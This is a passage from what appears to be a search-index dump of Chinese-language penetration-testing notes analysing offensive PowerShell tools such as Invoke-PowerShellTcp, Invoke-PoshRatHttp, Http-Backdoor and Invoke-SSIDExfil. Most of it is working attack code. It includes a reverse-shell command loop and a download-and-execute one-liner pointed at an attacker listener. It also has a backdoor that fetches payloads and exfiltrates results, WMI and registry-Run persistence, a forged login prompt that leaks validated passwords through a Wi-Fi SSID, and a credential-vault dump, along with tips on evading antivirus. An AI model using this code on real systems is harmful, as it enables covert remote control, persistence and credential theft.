(Get-Location).Path + '>') $stream.Write($sendbytes,0,$sendbytes.Length) \u968f\u540e\u4fbf\u662f\u5904\u7406\u6d88\u606f\u4f20\u9012\u4e0e\u547d\u4ee4\u6267\u884c while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) //\u76d1\u542c\u94fe\u63a5\u4f20\u6765\u7684\u8baf\u606f { $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding $data = $EncodedText.GetString($bytes,0, $i) //$data\u4e3a\u8fdc\u7a0b\u4f20\u6765\u7684\u4fe1\u606f\uff0c\u4e00\u822c\u4e3a\u547d\u4ee4 try { #Execute the command on the target. $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String ) //\u6b64\u53d8\u91cf\u5b58\u50a8\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c } catch { Write-Warning \"Something went wrong with execution of command on the target.\" Write-Error $_ } $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ' $x = ($error[0] | Out-String) //\u9519\u8bef\u4fe1\u606f $error.clear() $sendback2 = $sendback2 + $x #Return the results $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) //\u8fd4\u56de\u4fe1\u606f $stream.Flush() } \u600e\u6837\u4f18\u5316\uff1f \u53ef\u4ee5\u5bf9\u6d41\u91cf\u8fdb\u884c\u4e00\u6b65\u4f18\u5316\uff1a\u5bf9stream\u4e2d\u7684IO\u5957\u7528\u52a0\u89e3\u5bc6\uff0c\u4e00\u65b9\u9762\u662f\u7ed9\u4fe1\u606f\u4f20\u56de\u5957\u52a0\u5bc6\uff0c\u53e6\u4e00\u65b9\u9762\u662f\u7ed9\u6307\u4ee4\u53d1\u653e\u5957\u52a0\u5bc6\uff08\u8fd9\u4e00\u6b65\u9700\u8981\u63a7\u5236\u7aef\u989d\u5916\u7f16\u5199\u52a0\u5bc6\u6307\u4ee4\u53d1\u9001\u5de5\u5177\uff09","title":"Invoke-powershelltcp"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#invoke-poshrathttp","text":"Invoke-PoshRatHttp\u662f\u4e00\u4e2a\u57fa\u4e8eHTTP\u7684\u5f39shell\u5de5\u5177 \u5b83\u7684\u5927\u81f4\u903b\u8f91\u4e3a\uff1a1.\u672c\u5730\u76d1\u542c\u7aef\u53e3\uff0c\u751f\u6210\u4e00\u6bb5powershell\u8fdc\u7a0b\u52a0\u8f7d\u6307\u4ee4 2.\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884cpowershell\u8fdc\u7a0b\u52a0\u8f7d\u6307\u4ee4\uff0c\u4f7f\u5176\u6267\u884c\u53e6\u4e00\u4e2aURL\u4e0aHTTP\u4f20\u56de\u7684\u547d\u4ee4\uff0c\u5e76\u901a\u8fc7POST\u5411\u6b64URL\u4f20\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u5b98\u65b9\u63cf\u8ff0(\u6b64\u811a\u672c\u8fd8\u53ef\u901a\u8fc7hta\u6267\u884c\u547d\u4ee4\uff0c\u4e0d\u8fc7\u672c\u6587\u5c31\u4e0d\u8d58\u8ff0\u4e86) This script starts a listener on the attacker's machine. The listener needs a port to listen. On the target machine execute the below command from PowerShell: iex (New-Object Net.WebClient).DownloadString(\"http://ListenerIPAddress/connect\") or trick a user in connecting to: http://ListenerIPAddress/WindowsDefender.hta The listener opens incoming traffic on the specified port by the name of \"Windows Update HTTP\". The listener needs to be run from an elevated PowerShell session. The script has been originally written by Casey Smith (@subTee) \u53c2\u6570 \u53c2\u6570\u90e8\u5206\u6ca1\u4ec0\u4e48\u8bf4\u7684\uff0c\u5c31\u662f\u6307\u5b9a\u672c\u5730IP\u4e0e\u7aef\u53e3\u800c\u5df2 [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $true)] [String] $IPAddress, [Parameter(Position = 1, Mandatory = $true)] [Int] $Port ) \u5177\u4f53\u903b\u8f91 \u811a\u672c\u5f00\u59cb\u8fd0\u884c\u540e\u4f1a\u76d1\u542c\u672c\u5730\u7aef\u53e3\uff0c\u5e76\u6839\u636e\u4f20\u5165\u7684ipaddress\u548cport\u751f\u6210powershell\u4e00\u53e5\u8bdd\u6307\u4ee4\uff0c\u6267\u884c\u8be5\u6307\u4ee4\u4f1a\u4f7f\u7528\u6237\u6267\u884c\u8fdc\u7a0bURL\u5f97\u5230\u7684payload $listener = New-Object System.Net.HttpListener $listener.Prefixes.Add(\"http://+:$Port/\") #Create Firewall Rules netsh advfirewall firewall delete rule name=\"WindowsUpdate HTTP\" | Out-Null netsh advfirewall firewall add rule name=\"WindowsUpdate HTTP\" dir=in action=allow protocol=TCP localport=$Port | Out-Null $listener.Start() Write-Output \"Listening on $IPAddress`:$Port\" Write-Output \"Run the following command on the target:\" Write-Output \"powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))\" \u968f\u540e\u901a\u8fc7\u4e00\u4e2a\u5927\u7684while\u5faa\u73af\u76d1\u542c\u5bf9\u6b64\u7aef\u53e3\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u3002 \u5728\u5176\u4e2d\uff0c\u5982\u679c\u76d1\u542c\u5230\u4ee5connect\u7ed3\u5c3e\u7684GET\u8bf7\u6c42\uff0c\u5219\u751f\u6210\u4e00\u6bb5payload\uff0c\u5e76\u5728\u6700\u540eHTTP\u5e94\u7b54\u56de\u53bb\u3002\uff08IEX ((New-Object Net.WebClient).DownloadString \u662f\u4ee5GET\u8bf7\u6c42\u5de5\u4f5c\u7684\uff09 \u5728\u53d7\u5bb3\u8005\u6267\u884chttp\\://.../connect\u5f97\u5230\u7684\u811a\u672c\u540e\uff0c\u4fbf\u4f1a\u6267\u884chttp\\://.../rat\u4f20\u6765\u7684PAYLOAD\uff0c\u5728\u53d7\u5bb3\u673a\u6267\u884c\u4e86http\\://.../rat \u4f20\u56depayload\u540e\uff0c\u4f1a\u901a\u8fc7uploadString\u65b9\u6cd5\u4ee5POST\u65b9\u5f0f\u5c06\u6267\u884c\u7ed3\u679c\u4f20\u56dehttp\\://../rat if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq \"GET\")) { $message = \" `$s = `\"http://$IPAddress`:$Port/rat`\" `$w = New-Object Net.WebClient while(`$true) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true} `$r = `$w.DownloadString(`$s) while(`$r) { `$o = invoke-expression `$r | out-string `$w.UploadString(`$s, `$o) break } } \" } ...... [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() http://.../rat \u7684\u76f8\u5173\u903b\u8f91\u662f\u8fd9\u4e48\u5199\u7684 \u5f53http\\://.../rat \u88ab\u4ee5GET\u65b9\u6cd5\u8bbf\u95ee\u540e\uff0c\u653b\u51fb\u673a\u4f1a\u7b49\u5f85\u7ec8\u7aef\u7684\u8f93\u5165\uff0c\u7136\u540e\u5c06\u5176\u4f5c\u4e3aHTTP\u5e94\u7b54\u4f20\u56de\u3002 \u5f53http\\://.../rat \u88ab\u4ee5POST\u65b9\u6cd5\u8bbf\u95ee\u540e\uff0c\u653b\u51fb\u673a\u5219\u4f1a\u83b7\u53d6\u8be5\u8bf7\u6c42\u5e76\u628a\u8bf7\u6c42\u5185\u5bb9\u8f93\u51fa\u5230\u7ec8\u7aef\u3002\uff08\u4e5f\u5c31\u662f\u8bf4\u4f1a\u628a\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u5230\u7ec8\u7aef) if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq \"POST\") ) { Receive-Request($request) } if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq \"GET\")) { $response.ContentType = 'text/plain' $message = Read-Host \"PS $hostip>\" #If the Server/Attacker uses the exit command. Close the client part and the server. if ($message -eq \"exit\") { [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() $listener.Stop() break } } \u00b7\u00b7\u00b7\u00b7 [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() \u600e\u4e48\u4f18\u5316\uff1f powershell\u8fdc\u7a0b\u811a\u672c\u514d\u6740\u8981\u505a\u597d\uff0c\u4e0d\u7136\u6839\u672c\u4e0d\u53ef\u80fd\u8fc7AV IO\u5957\u52a0\u5bc6","title":"Invoke-PoshRatHttp"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#backdoor","text":"","title":"backdoor"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#http-backdoor","text":"Http-Backdoor\u662f\u4e00\u4e2a\u57fa\u4e8eHTTP\u7684\u540e\u95e8\u7a0b\u5e8f\u3002 \u5b83\u7684\u5927\u81f4\u903b\u8f91\u662f\u5b9a\u65f6\u8bbf\u95ee\u7279\u5b9aURL\uff08targeturl\uff09\u82e5URL\u8fd4\u56de\u7279\u5b9a\u503c\u5219\u4ece\u53e6\u4e00\u4e2a\u6307\u5b9aURL\uff08payloadurl\uff09\u4e0b\u8f7dpayload\u6587\u4ef6\u5e76\u6267\u884c\u3002 \u53c2\u6570 [CmdletBinding(DefaultParameterSetName=\"noexfil\")] Param( [Parameter(Parametersetname=\"exfil\")] [Switch] $persist, //\u662f\u5426\u505a\u6301\u4e45\u5316 [Parameter(Parametersetname=\"exfil\")] [Switch] $exfil, //\u662f\u5426\u6570\u636e\u56de\u663e [Parameter(Position = 0, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 0, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $CheckURL, //\u4ece\u54ea\u4e2aURL\u68c0\u6d4b\u5f00\u59cb\u6807\u5fd7\u548c\u7ed3\u675f\u6807\u5fd7 [Parameter(Position = 1, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 1, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $PayloadURL, //\u4ece\u54ea\u4e2aURL\u4e0b\u8f7dPAYLOAD [Parameter(Position = 2, Mandatory = $False, Parametersetname=\"exfil\")] [Parameter(Position = 2, Mandatory = $False, Parametersetname=\"noexfil\")] [String] $Arguments = \"Out-Null\", //\u989d\u5916\u7684\u9644\u52a0\u6307\u4ee4\uff0c\u4f1a\u5728\u6728\u9a6c\u5de5\u4f5c\u65f6\u8fd0\u884c [Parameter(Position = 3, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 3, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $MagicString, //\u4ecetargeturl\u83b7\u53d6\u5230\u8be5\u6807\u5fd7\u540e\u4ecePayloadUrl\u4e0b\u8f7dpayload\u6267\u884c [Parameter(Position = 4, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 4, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $StopString, //\u4ecetargeturl\u83b7\u53d6\u5230\u8be5\u6807\u5fd7\u540e\u7ed3\u675f\u540e\u95e8\u5de5\u4f5c [Parameter(Position = 5, Mandatory = $False, Parametersetname=\"exfil\")] [ValidateSet(\"gmail\",\"pastebin\",\"WebServer\",\"DNS\")] [String] $ExfilOption, //\u6570\u636e\u56de\u663e\u7684\u65b9\u5f0f //\u4ee5\u4e0b\u53c2\u6570\u4e3a\u6570\u636e\u56de\u663e\u7684\u4e00\u4e9b\u53c2\u6570 [Parameter(Position = 6, Mandatory = $False, Parametersetname=\"exfil\")] [String] $dev_key = \"null\", [Parameter(Position = 7, Mandatory = $False, Parametersetname=\"exfil\")] [String] $username = \"null\", [Parameter(Position = 8, Mandatory = $False, Parametersetname=\"exfil\")] [String] $password = \"null\", [Parameter(Position = 9, Mandatory = $False, Parametersetname=\"exfil\")] [String] $URL = \"null\", [Parameter(Position = 10, Mandatory = $False, Parametersetname=\"exfil\")] [String] $DomainName = \"null\", [Parameter(Position = 11, Mandatory = $False, Parametersetname=\"exfil\")] [String] $AuthNS = \"null\" ) \u53c2\u6570\u8fd8\u662f\u6709\u5f88\u591a\u7684\uff0c\u4f46\u53ea\u5bf9\u5e94\u4e24\u4e2a\u53c2\u6570\u96c6exfil\uff08\u6709\u6570\u636e\u56de\u663e\uff09\uff0c\u548cnoexfil\uff08\u65e0\u6570\u636e\u56de\u663e\uff09 \u5177\u4f53\u903b\u8f91 \u5728\u4ee3\u7801\u4e3b\u4f53\u7684\u5f00\u59cb\uff0c\u5b9a\u4e49\u4e86\u4e24\u4e2a\u53d8\u91cf\uff08$body\u548c$exfiltration\uff09\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u5b58\u653e\u540e\u95e8\u672c\u4f53\u51fd\u6570\uff08HTTP-Backdoor-Logic\uff09\u548c\u540e\u95e8\u6570\u636e\u5e26\u51fa\u51fd\u6570\uff08Do-Exfiltration-HTTP\uff09\uff0c\u6211\u4eec\u7a0d\u540e\u6765\u5206\u6790\u4ed6\u4eec\u4fe9\u3002 \u53ef\u4ee5\u770b\u5230\u5728\u4ee3\u7801\u5f00\u59cb\u8fd0\u884c\u65f6\uff0c\u4f1a\u68c0\u6d4b\u662f\u5426\u6709persist\u53c2\u6570\uff0c\u8fdb\u800c\u51b3\u5b9a\u662f\u5426\u505a\u6301\u4e45\u5316\u5de5\u4f5c\uff0c\u6301\u4e45\u5316\u7684\u76f8\u5173\u4ee3\u7801\u6211\u4eec\u7a0d\u540e\u8ba8\u8bba\u3002 \u5148\u6765\u770bpersist\u4e3aflase\u65f6\uff0c\u4f1a\u56e0exfil\u53c2\u6570\u662f\u5426\u5b58\u5728\u800c\u5206\u60c5\u51b5\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf$options\uff0c\u5199\u5165 \u8c03\u7528\u6728\u9a6c\u7684 \u4ee3\u7801\u3002 \u968f\u540e\u5c06HTTP-Backdoor-Logic\uff08\u5bf9\u5e94$body\uff09\u548cDo-Exfiltration-HTTP\uff08\u5bf9\u5e94$exfiltration\uff09\u4ee5\u53ca\u8c03\u7528\u6728\u9a6c\u7684\u4ee3\u7801$options \u5199\u5165\u4e00\u4e2a\u6587\u4ef6\uff0c\u5e76\u6267\u884c\u3002 $modulename = \"HTTP-Backdoor.ps1\" if($persist -eq $True) { //\u6301\u4e45\u5316\u5de5\u4f5c\uff0c\u6211\u4eec\u7a0d\u540e\u6765\u8ba8\u8bba\u6b64\u5904 else { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString\" if ($exfil -eq $True) { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil\" } if(1 -eq 1){ } Out-File -InputObject $body -Force $env:TEMP\\$modulename Out-File -InputObject $exfiltration -Append $env:TEMP\\$modulename Out-File -InputObject $options -Append $env:TEMP\\$modulename Invoke-Expression $env:TEMP\\$modulename } } \u968f\u540e\u6211\u4eec\u518d\u6765\u770b\u770b\\$body \u4e2d\u7684\u5185\u5bb9 \u9996\u5148\u662f\u4e00\u4e2a\u5927\u7684while true\u5faa\u73af\uff0c\u7136\u540e\u4fbf\u662f\u5b9a\u65f6\u83b7\u53d6CheckUrl\u4e0a\u7684\u5185\u5bb9\uff0c\u82e5CheckURL\u4e0a\u7684\u5185\u5bb9\u4e0eMagicString \u4e00\u81f4\uff0c\u5219\u4ecePayloadUrl\u5904\u4e0b\u8f7dpayload\u6267\u884c\u3002 \u968f\u540e\u6267\u884c$Arguments\u53c2\u6570\u6307\u5b9a\u7684\u547d\u4ee4\uff0c\u518d\u7136\u540e\u5224\u5b9a$exfil\u53c2\u6570\u662f\u5426\u5b58\u5728\u800c\u662f\u5426\u505a\u51fa\u6570\u636e\u5916\u5e26\u884c\u4e3a\u3002 \u7136\u540e\u8fdb\u516560s\u7684\u4f11\u7720\uff0c\u82e5\u83b7\u53d6CheckUrl\u4e0a\u7684\u5185\u5bb9\u4e3aStopString\u5219\u505c\u6b62\u8fd0\u884c\u7a0b\u5e8f\u3002 $body = @' function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) { while($true) { $exec = 0 start-sleep -seconds 5 $webclient = New-Object System.Net.WebClient $filecontent = $webclient.DownloadString(\"$CheckURL\") $filecontent = $filecontent.TrimEnd() if($filecontent -eq $MagicString) { $script:pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL) # Check for arguments to the downloaded script. if ($Arguments -ne \"Out-Null\") { $pastevalue = Invoke-Expression $Arguments } $pastevalue $exec++ if ($exfil -eq $True) { $pastename = $env:COMPUTERNAME + \" Results of HTTP Backdoor: \" Do-Exfiltration-HTTP \"$pastename\" \"$pastevalue\" \"$ExfilOption\" \"$dev_key\" \"$username\" \"$password\" \"$URL\" \"$DomainName\" \"$AuthNS\" } if ($exec -eq 1) { Start-Sleep -Seconds 60 } } elseif ($filecontent -eq $StopString) { break } } } '@ \u5173\u4e8e\u6570\u636e\u5916\u5e26\u7684Do-Exfiltration-HTTP\u65b9\u6cd5\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u5b83\u4e3b\u8981\u91c7\u7528\u4e86\u4e09\u79cd\u5916\u5e26\u65b9\u6cd5\uff1a 1\u00b7\u901a\u8fc7\u516c\u5171\u7cfb\u7edf\uff0c\u91c7\u7528\u7279\u5b9aAPI\u4f20\u56de\u6570\u636e\uff0c\u5982\u901a\u8fc7gmail\u53d1\u90ae\u7bb1\u4ee5\u53capastebin\uff08\u7528\u6765\u5728\u7ebf\u5b58\u50a8\u6587\u672c\u7684\u7f51\u7ad9\uff09 2\u00b7\u901a\u8fc7POST\u65b9\u6cd5\u5411\u6307\u5b9aURL\u53d1\u5305\u4f20\u53c2 3\u00b7DNS\u5916\u5e26 \u6211\u4eec\u518d\u6765\u770b\u770b\u5b83\u505a\u7684\u6301\u4e45\u5316\u5427\u3002 \u903b\u8f91\u4e5f\u5f88\u7b80\u5355\uff0c\u5927\u4f53\u5c31\u662f\u5148\u628a\u540e\u95e8\u672c\u4f53\u5199\u5165\u5230\u4e00\u4e2a\u6587\u4ef6\u540e\uff0c\u521b\u5efa\u4e00\u4e2a\u8c03\u7528\u540e\u95e8\u7684VBS\u811a\u672c \u7136\u540e\u5224\u65ad\u5f53\u524d\u7528\u6237\u8eab\u4efd\uff0c\u5982\u679c\u662fAdministrator\u5219\u901a\u8fc7WMI\u7ed1\u5b9aVBS\u811a\u672c\u7559\u540e\u95e8\uff08\u8fc7\u6ee4\u5668\u76d1\u542c\u7528\u6237\u767b\u5f55\uff09 \u4e0d\u662fadministrator\u5c31\u5411\u6ce8\u518c\u8868\u628aVBS\u5199\u5165\u5f00\u673a\u9879\u3002 $name = \"persist.vbs\" $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString\" if ($exfil -eq $True) { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil\" } Out-File -InputObject $body -Force $env:TEMP\\$modulename Out-File -InputObject $exfiltration -Append $env:TEMP\\$modulename Out-File -InputObject $options -Append $env:TEMP\\$modulename echo \"Set objShell = CreateObject(`\"Wscript.shell`\")\" > $env:TEMP\\$name echo \"objShell.run(`\"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\\$modulename`\")\" >> $env:TEMP\\$name $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true) { $scriptpath = $env:TEMP $scriptFileName = \"$scriptpath\\$name\" $filterNS = \"root\\cimv2\" $wmiNS = \"root\\subscription\" $query = @\" Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession' \"@ $filterName = \"WindowsSanity\" $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage=\"WQL\"; Query=$query} $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name=\"WindowsSanity\"; ScriptFileName=$scriptFileName; ScriptingEngine=\"VBScript\"} Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} | out-null } else { New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update -PropertyType String -Value $env:TEMP\\$name -force echo \"Set objShell = CreateObject(`\"Wscript.shell`\")\" > $env:TEMP\\$name echo \"objShell.run(`\"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\\$modulename`\")\" >> $env:TEMP\\$name } } \u600e\u4e48\u4f18\u5316 IO\u52a0\u5bc6","title":"Http-Backdoor"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#gather","text":"","title":"Gather"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#get-webcredentials","text":"\u6b64\u811a\u672c\u7528\u4e8e\u6536\u96c6\u7f51\u7ad9\u7528\u6237\u5bc6\u7801\uff0c\u5f88\u77ed\uff0c\u4f46\u662f\u5176\u6536\u96c6\u5bc6\u7801\u7684\u65b9\u5f0f\u4f5c\u4e3a\u83dc\u9e21\u7684\u6211\u8fd8\u662f\u7b2c\u4e00\u6b21\u89c1\u3002 \u53c2\u6570 \u6ca1\u6709\u53c2\u6570 \u5177\u4f53\u903b\u8f91 Windows.Security.Credentials.PasswordVault \u662f\u4e00\u4e2a\u8bb0\u5f55\u5e94\u7528\u548c\u670d\u52a1\u51ed\u8bc1\u7684class\u3002 \u6211\u4eec\u53ea\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u7b80\u5355\u7684\u904d\u5386\u8f93\u51fa\uff0c\u4fbf\u53ef\u4ee5\u5f97\u5230\u4e00\u4e9b\u51ed\u8bc1\u3002 $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] //\u8fd9\u4e00\u6bb5\u53ef\u4ee5\u4e0d\u8981 $VaultObj = new-object Windows.Security.Credentials.PasswordVault $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } Invoke-SSIDEXfil \u8fd9\u4e2a\u811a\u672c\u8fd0\u884c\u540e\u4f1a\u5f39\u51fa\u4e00\u4e2a\u767b\u5f55\u6846\u8981\u6c42\u7528\u6237\u8f93\u5165\u6b63\u786e\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u82e5\u4e0d\u6b63\u786e\u8fd8\u4f1a\u4e00\u76f4\u5f39\u6846\u3002\u6700\u540e\u628a\u6b63\u786e\u7684\u5bc6\u7801\u8d26\u6237\u901a\u8fc7SSID\u5916\u5e26\u51fa\u6765\u3002 \u8fd9\u91cc\u6211\u5bf9\u5b83\u600e\u4e48\u5916\u5e26\u6570\u636e\u4e0d\u592a\u611f\u5174\u8da3\uff0c\u6211\u66f4\u611f\u5174\u8da3\u7684\u662f\u90a3\u4e2a\u5f39\u767b\u5f55\u6846\u4ee5\u53ca\u9a8c\u8bc1\u51ed\u8bc1\u7684\u64cd\u4f5c\u3002 \u4f53\u903b\u8f91\uff08\u767b\u5f55\u6846\uff09 \u5173\u4e8e\u767b\u5f55\u6846\u5bf9\u51ed\u636e\u7684\u9a8c\u8bc1\u662f\u8fd9\u4e48\u4e2a\u903b\u8f91\uff1a 1.\u82e5\u662f\u975e\u57df\u7528\u6237\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u57fa\u4e8e\u8ba1\u7b97\u673a\u7684\u7528\u6237\u4e3b\u4f53\uff08\u5c01\u88c5\u4e86\u5e10\u6237\u6570\u636e\u548c\u64cd\u4f5c\u5171\u540c\u6240\u6709\u5b89\u5168\u4e3b\u4f53\u3002\u8fd9\u662f\u6240\u6709\u5b89\u5168\u4e3b\u4f53\u7684\u62bd\u8c61\u57fa\u7c7b\uff09\uff0c\u5e76\u5411\u7528\u6237\u4e3b\u4f53\u4f20\u5165\u51ed\u8bc1\u8fdb\u884c\u9a8c\u8bc1 2.\u82e5\u662f\u57df\u7528\u6237\uff0c\u5219\u901a\u8fc7\u4f20\u5165\u7684\u57df\uff0c\u7528\u6237\u540d\uff0c\u5bc6\u7801\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2a DirectoryEntry \u6765\u8fbe\u5230\u9a8c\u8bc1\u51ed\u8bc1\u6b63\u786e\u6027\u7684\u76ee\u7684 Add-Type -assemblyname system.DirectoryServices.accountmanagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName ..... while($true) { #Displaying a forged login prompt to the user. $credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation\", \"Please enter your user name and password.\", \"\", \"\") //\u8fd9\u53e5\u8d1f\u8d23\u8bbe\u7f6e\u767b\u9646\u6846\u63d0\u793a\u4fe1\u606f\u548c\u6807\u9898 if($credential) { $creds = $credential.GetNetworkCredential() [String]$user = $creds.username [String]$pass = $creds.password [String]$domain = $creds.domain #Check for validity of credentials locally and with domain. $authlocal = $DS.ValidateCredentials($user, $pass) $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass) if(($authlocal -eq $true) -or ($authdomain.name -ne $null)) { $output = $authdomain.name + \":\" + $user + \":\" + $pass $ssidname = ConvertTo-ROT13 -rot13string $output Write-Verbose \"Setting the hosted network SSID to $ssidname in the form Domain:Username:Password.\" netsh wlan set hostednetwork mode=allow ssid=`\"$ssidname`\" key='HardtoGuess!@#123' Write-Verbose \"Startig the hosted network SSID $ssidname.\" netsh wlan start hostednetwork break } } }","title":"Get-WebCredentials"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#powerview","text":"","title":"powerview"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#get-netsession","text":"\u4ece\u4e00\u53f0\u673a\u5668\u4e0a\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4fe1\u606f","title":"Get-NetSession"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_4","text":"\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6307\u5b9a\u673a\u5668\u7684IP\u6216\u673a\u5668\u540d \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2apowershell\u4e0b\u7684\u7528\u6237\u51ed\u8bc1\u4fe1\u606f\u7c7b\uff0c\u53ef\u4ee5\u8be6\u89c1\u8fd9\u91cc https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.1 , Param( [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)] [Alias('HostName', 'dnshostname', 'name')] [ValidateNotNullOrEmpty()] [String[]] $ComputerName = 'localhost', [Management.Automation.PSCredential] [Management.Automation.CredentialAttribute()] $Credential = [Management.Automation.PSCredential]::Empty 